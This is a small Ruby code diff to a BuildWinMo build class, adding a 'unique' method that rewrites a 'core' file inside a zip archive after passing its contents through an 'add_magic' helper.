@@ -108,8 +108,16 @@ class BuildWinMo < Build
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
     end
-
   end
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('core', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('core', "wb") { |f| f.write core_content }
+    end
+  end
+
 end
 
 end #DB::
